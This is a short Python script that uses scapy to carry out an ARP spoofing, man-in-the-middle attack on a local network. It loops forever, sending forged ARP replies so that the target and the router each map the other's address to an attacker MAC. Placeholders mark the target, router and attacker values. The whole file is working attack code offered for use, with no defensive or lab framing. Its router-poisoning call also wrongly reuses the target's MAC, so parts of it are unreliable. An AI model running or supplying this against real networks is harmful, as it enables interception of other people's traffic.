import time
from scapy.all import ARP, Ether, srp, sendp

def arp_spoof(target_ip, spoof_ip, target_mac, spoof_mac):
    """
    Sends an ARP reply to spoof the target device.

    Parameters:
    target_ip (str): IP address of the target device .
    spoof_ip (str): IP address you want to impersonate .
    target_mac (str): MAC address of the target device .
    spoof_mac (str): MAC address to impersonate .
    """
    # Build the ARP reply packet
    arp_reply = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac, hwsrc=spoof_mac)

    # Wrap the ARP reply in an Ethernet frame with the proper destination MAC
    ether_frame = Ether(dst=target_mac)
    packet = ether_frame / arp_reply

    # Send the packet
    sendp(packet, verbose=False)

def send_broadcast_arp_request(t1, t2, m1):
    """
    Sends an ARP request to broadcast in the network.
    """
    # Create an ARP request packet
    arp_request = ARP(op=1, psrc=t1, pdst=t2, hwsrc=m1)  # op=1 for ARP request
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet broadcast MAC address

    # Combine both the Ethernet frame and ARP request into a single packet
    packet = ether_frame / arp_request

    # Send the packet and receive the response
    result = srp(packet, timeout=3, verbose=False)[0]
    return result

def main():
    # Device and network details
    target_ip = "TARGET_IP"  # Target device IP (replace with placeholder)
    router_ip = "ROUTER_IP"  # IP address of the router (replace with placeholder)
    target_mac = "TARGET_MAC"  # Target device MAC address (replace with placeholder)
    attacker_mac = "ATTACKER_MAC"  # Attacker (this device) MAC address (replace with placeholder)

    # Step 1: ARP Spoofing
    print("[*] Sending ARP spoofing packets...")
    while True:
        # Spoof ARP to make target device think that the router is at the attacker's MAC address
        arp_spoof(target_ip, router_ip, target_mac, attacker_mac)

        # Spoof ARP to make the router think that target device is at the attacker's MAC address
        arp_spoof(router_ip, target_ip, target_mac, attacker_mac)

        # Optionally, send broadcast ARP requests to refresh the ARP tables in the network
        send_broadcast_arp_request(router_ip, target_ip, attacker_mac)

        print(f"[*] ARP spoof: {target_ip} now thinks {router_ip} is at {attacker_mac}")
        print(f"[*] ARP spoof: {router_ip} now thinks {target_ip} is at {attacker_mac}")

        # Sleep to control the rate of ARP packets to prevent flooding the network
        time.sleep(2)  # Adjust this time as necessary to avoid flooding

if __name__ == "__main__":
    main()
